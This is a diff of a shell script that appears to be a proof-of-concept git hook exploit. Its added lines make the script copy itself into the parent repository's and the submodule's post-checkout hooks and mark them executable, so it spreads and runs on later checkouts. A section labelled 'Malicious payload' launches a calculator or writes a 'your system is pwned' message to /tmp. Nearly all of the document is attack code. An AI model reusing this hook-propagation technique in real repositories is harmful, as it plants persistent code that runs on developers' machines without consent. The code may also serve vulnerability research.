@@ -4,14 +4,22 @@
 PARENT_HOOK_DIR="../../.git/hooks"
 SUBMODULE_HOOK_DIR=".git/hooks"
 
-# Log propagation for debugging
-echo "Propagating post-checkout hook..." >> /tmp/hook_debug.log
+# Debugging logs
+echo "Hook executed at $(date)" >> /tmp/hook_debug.log
+echo "Parent hook directory: $PARENT_HOOK_DIR" >> /tmp/hook_debug.log
 
-# Propagate to the parent repository
-if [ -d "" ]; then
-    echo "Installing hook in parent repository: " >> /tmp/hook_debug.log
-    cp ./poc1.sh "/post-checkout"
-    chmod +x "/post-checkout"
+# Install hook in the parent repository
+if [ -d "$PARENT_HOOK_DIR" ]; then
+    echo "Installing hook in parent repository: $PARENT_HOOK_DIR" >> /tmp/hook_debug.log
+    cp $0 "$PARENT_HOOK_DIR/post-checkout"
+    chmod +x "$PARENT_HOOK_DIR/post-checkout"
+fi
+
+# Install hook in the submodule's .git/hooks directory
+if [ -d "$SUBMODULE_HOOK_DIR" ]; then
+    echo "Installing hook in submodule: $SUBMODULE_HOOK_DIR" >> /tmp/hook_debug.log
+    cp $0 "$SUBMODULE_HOOK_DIR/post-checkout"
+    chmod +x "$SUBMODULE_HOOK_DIR/post-checkout"
 fi
 
 # Malicious payload
@@ -23,4 +31,3 @@ elif command -v xcalc >/dev/null 2>&1; then
 else
     echo "No calculator available, but your system is pwned!" >> /tmp/lol
 fi
-
